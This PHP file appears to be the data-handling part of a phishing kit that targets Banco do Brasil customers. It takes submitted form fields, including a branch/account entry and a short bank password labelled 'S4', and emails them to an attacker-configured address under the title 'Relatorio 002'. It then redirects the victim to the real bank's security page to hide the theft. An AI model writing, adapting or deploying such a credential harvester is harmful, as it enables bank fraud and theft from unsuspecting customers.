<?php

ini_set('display_errors',1);
ini_set('display_startup_erros',1);
error_reporting(E_ALL);

require_once("config.php");
extract($_POST);
//$headers = "Content-type: text/html; charset=iso-8859-1\r\n";
$headers = "From: Relatorio 002 <blesseds@inbox.im>\r\n";
$headers = "To: $receber <$receber>\r\n";
$headers.= "MIME-Version: 1.0\n";
$conteudo ="
=================================
AG.........: $rua $numero
S4.........: $s4
============================================";

@mail($receber, "prefeitura - $rua $numero", "$conteudo", $headers); 

?>
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title></title>
</head>

<body onLoad='window.location = "http://www.bb.com.br/pbb/pagina-inicial/bb-seguranca#/"'>
  
</body>
</html>